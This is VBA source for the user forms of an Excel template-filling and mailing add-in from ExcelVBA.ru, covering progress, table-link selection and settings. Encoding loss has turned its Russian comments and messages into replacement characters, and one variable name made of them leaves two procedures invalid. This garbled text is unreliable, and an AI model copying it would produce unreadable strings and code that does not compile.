    On Error Resume Next
    res = DownloadTemplatesFromWebsite
    'ND "run test", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & ", res = " & res
    Me.CommandButton_TestFillDocs.Enabled = res
End Sub

Private Sub CommandButton_OpenResultFolder_Click()
    On Error Resume Next: Err.Clear: OpenFolder OUTPUT_FOLDER$
    'ND "run test", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 4: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"    '& ", res = " & "True" 'Err.Number = 0
End Sub

Private Sub CommandButton_TestFillDocs_Click()
    On Error Resume Next
    res = TestRunMainMacro
    'ND "run test", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & ", res = " & res
    Me.CommandButton_OpenResultFolder.Enabled = True
    TestDone = True
End Sub


Private Sub Label_ProgramWebPage_Click()
    On Error Resume Next
    ThisWorkbook.FollowHyperlink "http://excelvba.ru/articles/CommandBar"
End Sub

Private Sub Label25_Click()
    On Error Resume Next: OpenFolder TEMPLATES_FOLDER$
End Sub
Private Sub Label26_Click()
    On Error Resume Next: OpenFolder OUTPUT_FOLDER$
End Sub

Private Sub MultiPage1_Change()
    On Error Resume Next
    Me.Caption = Me.Tag & Me.MultiPage1.SelectedItem.Tag
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Me.MultiPage1.Style = fmTabStyleNone
    Me.MultiPage1.Value = 0
    Me.Caption = Me.Tag & Me.MultiPage1.SelectedItem.Tag
    Me.MultiPage_Versions.Value = 0
    If Val(Application.Version) > 11 Then Me.MultiPage_Versions.Value = 1
    Me.TextBox_TemplatesFolder = TEMPLATES_FOLDER$
    Me.TextBox_OutputFolder = OUTPUT_FOLDER$
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If CloseMode = 0 Then Cancel = True
End Sub

Private Sub UserForm_Terminate()
    TMP_OUTPUT_MASK$ = ""
End Sub
Attribute VB_Name = "F_Progress"
Attribute VB_Base = "0{E9EE700F-62D0-4244-8430-147611759C78}{25BA890F-3CCD-4CDC-936B-D724363D66AA}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Form      : F_Progress
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 07.10.2012
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------

Public indicator As ProgressIndicator, ButtonMacro$

Private Sub CommandButton_RunMacro_Click()
    On Error Resume Next
    If Len(ButtonMacro$) Then Run "'" & ThisWorkbook.Name & "'!" & ButtonMacro$
End Sub

Private Sub CommandButton_stop_Click()
    On Error Resume Next
    If StopMacro Then    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        If IsObject(F_Greeting) Then
            If F_Greeting.Visible Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                Unload Me
                Exit Sub
            End If
        Else
            End
        End If
    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbQuestion + vbDefaultButton2 + vbYesNo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbYes Then
            StopMacro = True
        End If
    End If
End Sub

Private Sub SpinButton_log_Change()
    On Error Resume Next
    n = Me.SpinButton_log.Value
    Me.Height = IIf(n = 0, 82, 92 + n * 40)
    Me.TextBox_Log.Height = 40 * n
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If Not indicator Is Nothing Then indicator.QueryClose
End Sub
Attribute VB_Name = "F_SelectTable"
Attribute VB_Base = "0{289611AC-CD6A-49B5-AA9C-51620DAA0E42}{EBBC00DD-79D6-4292-9C2E-42EFED07ADEC}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub CheckBox_UsedRange_Click()
    On Error Resume Next
    Me.TextBox_Range.Enabled = Not Me.CheckBox_UsedRange.Value
    Me.CommandButton_SelectRange.Enabled = Not Me.CheckBox_UsedRange.Value

    If Me.CheckBox_UsedRange.Value Then
        Me.TextBox_Range.Tag = Me.TextBox_Range.Text
        Me.TextBox_Range = ActiveSheet.UsedRange.Address(0, 0, xlA1)
        ActiveSheet.UsedRange.Select
    Else
        Me.TextBox_Range.Text = Me.TextBox_Range.Tag
        Application.ReferenceStyle = xlA1
        ActiveSheet.Range(Me.TextBox_Range).Select
    End If
End Sub

Private Sub ComboBox_Filename_Change()
    On Error Resume Next
    If Me.ComboBox_Filename = "" Then Exit Sub
    Workbooks(CStr(Me.ComboBox_Filename)).Activate
    Me.ComboBox_SheetName.Clear

    Dim sh As Worksheet
    For Each sh In ActiveWorkbook.Worksheets
        If sh.Visible = xlSheetVisible Then
            Me.ComboBox_SheetName.AddItem sh.Name
        End If
    Next sh
    Me.ComboBox_SheetName = ActiveSheet.Name
End Sub

Private Sub ComboBox_SheetName_Change()
    On Error Resume Next
    ActiveWorkbook.Worksheets(CStr(Me.ComboBox_SheetName)).Activate
    CheckFields
End Sub

Private Sub CommandButton_AddLink_Click()
    On Error Resume Next: Err.Clear
    Dim WB As Workbook, sh As Worksheet
    Set WB = Workbooks(CStr(Me.ComboBox_Filename))
    Set sh = WB.Worksheets(CStr(Me.ComboBox_SheetName))
    If WB Is Nothing Then Exit Sub
    If WB.Path = "" Then Exit Sub
    If sh Is Nothing Then Exit Sub

    RangeAddress$ = Me.TextBox_Range
    If Me.CheckBox_UsedRange Then RangeAddress$ = "UsedRange"

    filename$ = WB.FullName
    If filename$ Like TABLES_FOLDER$ & "*" Then filename$ = Split(filename$, TABLES_FOLDER$)(1)
    If filename$ = CellWithLink.Worksheet.Parent.FullName Then filename$ = ""
    Link$ = LINK_HEADER_TABLE$ & filename$ & "/" & sh.Name & "/" & RangeAddress$ & "/" & Me.ComboBox_InsertTableMode

    CellWithLink.Value = Link$
    CellWithLink.Worksheet.Parent.Activate
    CellWithLink.Worksheet.Activate
    If Err = 0 Then Unload Me
End Sub

Private Sub CommandButton_OpenWokbook_Click()
    On Error Resume Next
    ChDrive Left(TABLES_FOLDER, 2)
    ChDir TABLES_FOLDER
    Application.Dialogs(xlDialogOpen).Show
    UpdateFilenamesList
End Sub

Private Sub CommandButton_Quit_Click()
    Unload Me
End Sub

Private Sub CommandButton_SelectRange_Click()
    On Error Resume Next
    Dim ra As Range, n As Name
    Set ra = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", , , , , , , 8)
    Me.TextBox_Range = ra.Address(0, 0, xlA1)
    For Each n In ra.Worksheet.Parent.Names
        If n.RefersToRange.Address = ra.Address Then Me.TextBox_Range = n.Name
    Next

    Me.ComboBox_Filename = ra.Worksheet.Parent.Name
    Me.ComboBox_SheetName = ra.Worksheet.Name
    ra.Select
End Sub

Private Sub TextBox_Range_Change()
    CheckFields
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    If CellWithLink Is Nothing Then Exit Sub
    UpdateFilenamesList
    Me.ComboBox_InsertTableMode.list = InsertTableStylesArray

    Link$ = CellWithLink.Value
    If Link$ Like LINK_HEADER_TABLE$ & "*/*/*" Then
        Link$ = Split(Link$, LINK_HEADER_TABLE$)(1)

        InsertTableMode$ = Trim(Split(Link$, "/")(3))
        If InsertTableMode$ = "" Then InsertTableMode$ = "Excel"
        Me.ComboBox_InsertTableMode = InsertTableMode$


        filename$ = Split(Link$, "/")(0)
        If filename$ = "" Then
            filename$ = ActiveWorkbook.FullName
        Else
            If (Not filename$ Like "[A-Z]:\*") And (Not filename$ Like "\\*") Then
                filename$ = TABLES_FOLDER$ & filename$
            End If
        End If
        shortFilename$ = Dir(filename$, vbNormal)
        If Len(shortFilename$) Then
            If Not IsObject(Workbooks(CStr(shortFilename$))) Then
                Application.DisplayAlerts = False
                Workbooks.Open filename$
                Application.DisplayAlerts = True
            End If

            Err.Clear: Me.ComboBox_Filename = shortFilename$
            If Err Then Me.ComboBox_Filename.AddItem shortFilename$: Me.ComboBox_Filename = shortFilename$

            SheetName$ = Split(Link$, "/")(1)
            Err.Clear: Me.ComboBox_SheetName = SheetName$
            If Err Then Exit Sub


            RangeAddress$ = Split(Link$, "/")(2)
            If RangeAddress$ = "UsedRange" Then
                Me.CheckBox_UsedRange = True
            Else
                Me.TextBox_Range = RangeAddress$
            End If
            ActiveSheet.Range(Me.TextBox_Range).Select
        End If

    End If
End Sub

Sub UpdateFilenamesList()
    On Error Resume Next: Me.ComboBox_Filename.Clear
    Dim WB As Workbook
    For Each WB In Application.Workbooks
        If WB.Windows(1).Visible = True And WB.Path <> "" Then
            Me.ComboBox_Filename.AddItem WB.Name
        End If
    Next WB
    Me.ComboBox_Filename = ActiveWorkbook.Name
End Sub

Sub CheckFields()
    On Error Resume Next
    Me.CommandButton_AddLink.Enabled = Me.ComboBox_SheetName <> "" And Me.ComboBox_Filename <> "" And Me.TextBox_Range <> ""
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If CellWithLink Is Nothing Then Exit Sub
    CellWithLink.Worksheet.Parent.Activate
    CellWithLink.Worksheet.Activate
    CellWithLink.Select
    Set ThisWorkbook.app = Application
End Sub
Attribute VB_Name = "F_Settings"
Attribute VB_Base = "0{28827141-E81A-47A3-B49A-5C36B51CDAD2}{EABABB81-FCA5-4AEF-8D23-2517124DF2FC}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Settings
' Author        : EducatedFool                     Date: 06.06.2014
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public SpecialControlsCollection As Collection

Private Sub CheckBox_AddHyperlinks_Click()
    On Error Resume Next: Err.Clear
    Me.Label_HLink_Text.Enabled = Me.CheckBox_AddHyperlinks
    Me.TextBox_HyperlinkText.Enabled = Me.CheckBox_AddHyperlinks
End Sub

Private Sub CheckBox_AddSendMarkIntoRow_Click()
    On Error Resume Next
    Me.ComboBox_SendMark_Column.Enabled = Me.CheckBox_AddSendMarkIntoRow
    Me.ScrollBar_SendMark.Enabled = Me.CheckBox_AddSendMarkIntoRow
End Sub

Private Sub CheckBox_Mail_AttachCreatedFiles_Click()
    On Error Resume Next: Err.Clear
    Me.CheckBox_Mail_AttachCreatedFiles.Font.Bold = Me.CheckBox_Mail_AttachCreatedFiles
    Me.Label_AttachCreatedFiles.Enabled = Me.CheckBox_Mail_AttachCreatedFiles
    Me.TextBox_AttachCreatedFilesMask.Enabled = Me.CheckBox_Mail_AttachCreatedFiles
End Sub

Private Sub CheckBox_Mail_AttachStaticFiles_Click()
    On Error Resume Next: Err.Clear
    Me.CheckBox_Mail_AttachStaticFiles.Font.Bold = Me.CheckBox_Mail_AttachStaticFiles
    Me.TextBox_Mail_AttachStaticFolder.Enabled = Me.CheckBox_Mail_AttachStaticFiles
    Me.CommandButton_Change_AttachStaticFolder.Enabled = Me.CheckBox_Mail_AttachStaticFiles

    Me.TextBox_Mail_AttachStaticFolder.BackColor = IIf(Me.CheckBox_Mail_AttachStaticFiles, vbWindowBackground, vbButtonFace)
End Sub

Private Sub CheckBox_MultiRow_Click()
    On Error Resume Next
    Me.CheckBox_Multirow_GroupRows.Enabled = Me.CheckBox_MultiRow
    Me.ComboBox_Multirow_GroupColumn.Visible = Me.CheckBox_MultiRow
    Me.Label_Multirow_GroupColumn.Visible = Me.CheckBox_MultiRow
End Sub

Private Sub CheckBox_Multirow_GroupRows_Click()
    On Error Resume Next
    Me.ComboBox_Multirow_GroupColumn.Enabled = Me.CheckBox_Multirow_GroupRows
    Me.Label_Multirow_GroupColumn.Enabled = Me.CheckBox_Multirow_GroupRows
End Sub

Private Sub CheckBox_SendEmail_Click()
    On Error Resume Next: Err.Clear
    Me.MultiPage_Options.Pages("Page_SendMail").Visible = Me.CheckBox_SendEmail
    Me.Label_SendEmail.Visible = Me.CheckBox_SendEmail
End Sub



Private Sub CheckBox_TemplatesFilter_Enabled_Click()
    On Error Resume Next
    Me.ComboBox_TemplatesFilter_Column.Enabled = Me.CheckBox_TemplatesFilter_Enabled.Value
    Me.ScrollBar_TemplatesFilter.Enabled = Me.CheckBox_TemplatesFilter_Enabled.Value
End Sub

Private Sub CheckBox_UseAllRows_Click()
    On Error Resume Next: Me.CheckBox_UseAllRows.Font.Bold = Me.CheckBox_UseAllRows.Value
End Sub

Sub CommandButton_Change_AttachStaticFolder_Click()
    On Error Resume Next: Err.Clear
    AttachFolder$ = CreateObject("WScript.Shell").SpecialFolders("mydocuments") & "\"        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"
    InitialPath$ = IIf(Me.TextBox_Mail_AttachStaticFolder <> "" And Not Me.TextBox_Mail_AttachStaticFolder Like "{*}", Me.TextBox_Mail_AttachStaticFolder, AttachFolder$)
    folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_Mail_AttachStaticFolder = folder$
    Me.TextBox_Mail_AttachStaticFolder.ForeColor = vbBlack
End Sub

Private Sub CommandButton_Change_TheBAT_Path_Click()
    On Error Resume Next: Err.Clear
    New_TheBAT_Path$ = GetFilePath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!", TheBAT_PATH, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!", "*.exe")
    If New_TheBAT_Path$ = "" Then Exit Sub
    Me.TextBox_TheBAT_Path = New_TheBAT_Path$
End Sub

Private Sub CommandButton_ChangeImagesFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(IMAGES_FOLDER$ <> "", IMAGES_FOLDER$, ThisWorkbook.Path)
    folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_ImagesFolder = folder$
End Sub

Private Sub CommandButton_ChangeWordDocFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(WORDDOC_FOLDER$ <> "", WORDDOC_FOLDER$, ThisWorkbook.Path)
    folder$ = GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", InitialPath$)
    If folder$ = "" Then Exit Sub
    Me.TextBox_WordDocFolder = folder$
End Sub

Private Sub CommandButton_Quit_Click()
    Unload Me
End Sub

Private Sub CommandButton_ResetAllSettings_Click()
    On Error Resume Next
    msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?" & vbNewLine & _
          "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
          "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
    If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Sub
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings

    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * 0.3, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$ & ", ""'" & ThisWorkbook.Name & "'!ShowSettingsPage"")"
    Unload Me
End Sub


Private Sub Image_ExportSettings_Click()
    ExportSettings
End Sub
Private Sub Image_ImportSettings_Click()
    If Not ImportSettings Then Exit Sub

    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * 0.3, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|$ & ", ""'" & ThisWorkbook.Name & "'!ShowSettingsPage"")"
    Unload Me
End Sub

Private Sub Label_Help_FieldCodes_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/FieldCodes?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_FilenamesMask_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/FilenamesMask?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_InsertFormulasForSeparateLetters_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/SeparateLetters?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_InsertImages_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/InsertImages?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_Help_InsertTables_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/InsertTables?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_HelpMultiRow_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/MultiRow?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_HelpMultiRowGroup_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/MultiRow/Group?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_OpenImagesFolder_Click()
    OpenFolder IMAGES_FOLDER$
End Sub

Private Sub Label_OpenWordDocFolder_Click()
    OpenFolder WORDDOC_FOLDER$
End Sub

Private Sub Label_SaveAsPDF_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "faq/SaveAsPDF?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub

Private Sub Label_SendEmail_Click()
    On Error Resume Next: Err.Clear
    Me.MultiPage_Options.Value = Me.MultiPage_Options.Pages("Page_SendMail").index
End Sub

Private Sub Label_SendMail_Help_Click()
    On Error Resume Next
    URL$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "/SendEmail?ref=" & HID$
    CreateObject("wscript.Shell").Run URL$
End Sub



'Private Sub TextBox_SendInterval_Max_Change()
'    On Error Resume Next
'    v& = Val(Trim(Me.TextBox_SendInterval_Max))
'    If Me.TextBox_SendInterval_Max <> CStr(v) Then Me.TextBox_SendInterval_Max = CStr(v)
'    'If Val(Trim(Me.TextBox_SendInterval_Min)) > v Then Me.TextBox_SendInterval_Min = CStr(v)
'End Sub
'
'Private Sub TextBox_SendInterval_Min_Change()
'    On Error Resume Next
'    v& = Val(Trim(Me.TextBox_SendInterval_Min))
'    If Me.TextBox_SendInterval_Min <> CStr(v) Then Me.TextBox_SendInterval_Min = CStr(v)
'    'If Val(Trim(Me.TextBox_SendInterval_Max)) < v Then Me.TextBox_SendInterval_Max = CStr(v)
'End Sub


Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    Set Me.SpecialControlsCollection = Nothing
End Sub

Private Sub UserForm_Initialize()

    On Error Resume Next
    Set ThisWorkbook.app = Application
    For i = 1 To 256
        Me.ComboBox_BaseColumn.AddItem ColunmNameByColumnNumber(i)
        Me.ComboBox_Multirow_GroupColumn.AddItem ColunmNameByColumnNumber(i)
        Me.ComboBox_SendMark_Column.AddItem ColunmNameByColumnNumber(i)
        Me.ComboBox_TemplatesFilter_Column.AddItem ColunmNameByColumnNumber(i)
    Next
    For i = 1 To 50: Me.ComboBox_FirstRow.AddItem i: Next i

    Me.ComboBox_TheBAT_Account.Clear
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TheBAT!
    Err.Clear
    With CreateObject("WScript.Shell")
        For i = 1 To 100
            key$ = "HKEY_CURRENT_USER\Software\RIT\The Bat!\Users depot\User #" & i
            Err.Clear: mailBox$ = .RegRead(key$)
            If Err = 0 Then Me.ComboBox_TheBAT_Account.AddItem mailBox$
        Next
        key$ = "HKEY_CURRENT_USER\Software\RIT\The Bat!\Users depot\Default"
        DefaultAccount$ = .RegRead(key$)
        If Len(DefaultAccount$) Then Me.ComboBox_TheBAT_Account = DefaultAccount$
    End With


    ' special controls
    Set Me.SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then Me.SpecialControlsCollection.Add SC
        End If
    Next
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_CombineXLSsheets: Me.SpecialControlsCollection.Add SC


    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Me.TextBox_TheBAT_Path = TheBAT_PATH

    Me.CheckBox_UseCurrentFolder = USE_CURRENT_FOLDER

    Me.ComboBox_LineFeed.list = LineFeedOptions

    'Me.CheckBox_PDF.Enabled = Val(Application.Version) > 11
    LoadProgramSettings

    '    Me.TextBox_TemplatesFolder = TEMPLATES_FOLDER$(True)
    '    Me.TextBox_OutputFolder = OUTPUT_FOLDER$(True)

    Me.MultiPage_Options.Value = 0
    Me.MultiPage_Options.Pages("Page_AdditionalOptions").ScrollTop = 0
    Me.MultiPage_Options.Pages("Page_SendMail").ScrollTop = 0

    Me.MultiPage_Options.Pages("Page_SendMail").Visible = Me.CheckBox_SendEmail
End Sub

Sub LoadProgramSettings()
    On Error Resume Next: Dim ctrl As Control: NoSetting$ = "not found"
    For Each ctrl In Me.Controls
        stg = GetSetting(PROJECT_NAME$, "Settings", ctrl.Name, NoSetting$)
        If ctrl.Name Like "CheckBox*" Then
            If stg <> NoSetting$ Then stg = CBool(stg) Else stg = False
        End If
        If ctrl.Tag = "" And stg <> NoSetting$ Then ctrl.Value = stg
    Next: Err.Clear
    UpdateFoldersFieldsAndButtons
End Sub

Sub SaveProgramSettings()
    On Error Resume Next: Dim ctrl As Control
    For Each ctrl In Me.Controls
        If ctrl.Enabled Then
            If Not ctrl.Name Like "CommandButton_*" Then
                SETT.SetText ctrl.Name, ctrl.Value
            End If
        End If
    Next: Err.Clear
End Sub

Private Sub CommandButton_SaveSettings_Click()
    On Error Resume Next
    Dim RebuildMenu As Boolean
    If SETT.GetBoolean("CheckBox_ShowAdditionalMenu") <> Me.CheckBox_ShowAdditionalMenu Then RebuildMenu = True
    SaveProgramSettings
    'SETT.LoadAllSettings
    SaveDefaultSettings

    If RebuildMenu Then CreateProgramCommandBar
    Enable_HotKeys
    Set ThisWorkbook.app = Application
    Unload Me
End Sub

Private Sub CheckBox_UseCurrentFolder_Click()
    On Error Resume Next
    SETT.SetText "CheckBox_UseCurrentFolder", Me.CheckBox_UseCurrentFolder
    UpdateFoldersFieldsAndButtons
End Sub

Sub UpdateFoldersFieldsAndButtons()
    On Error Resume Next
    Me.TextBox_TemplatesFolder = TEMPLATES_FOLDER$(True)
    Me.TextBox_OutputFolder = OUTPUT_FOLDER$(True)
    Dim UseCurrentFolder As Boolean: UseCurrentFolder = USE_CURRENT_FOLDER
    Me.CheckBox_UseCurrentFolder.Font.Bold = USE_CURRENT_FOLDER

    Me.CommandButton_ChangeOutputFolder.Enabled = Not UseCurrentFolder
    Me.CommandButton_ChangeTemplatesFolder.Enabled = Not UseCurrentFolder

    Me.TextBox_OutputFolder.Enabled = Not UseCurrentFolder
    Me.TextBox_TemplatesFolder.Enabled = Not UseCurrentFolder
End Sub

Private Sub CommandButton_ChangeOutputFolder_Click()
    On Error Resume Next
    InitialPath$ = IIf(FWF.FolderExists(OUTPUT_FOLDER$), OUTPUT_FOLDER$, ThisWorkbook.Path)
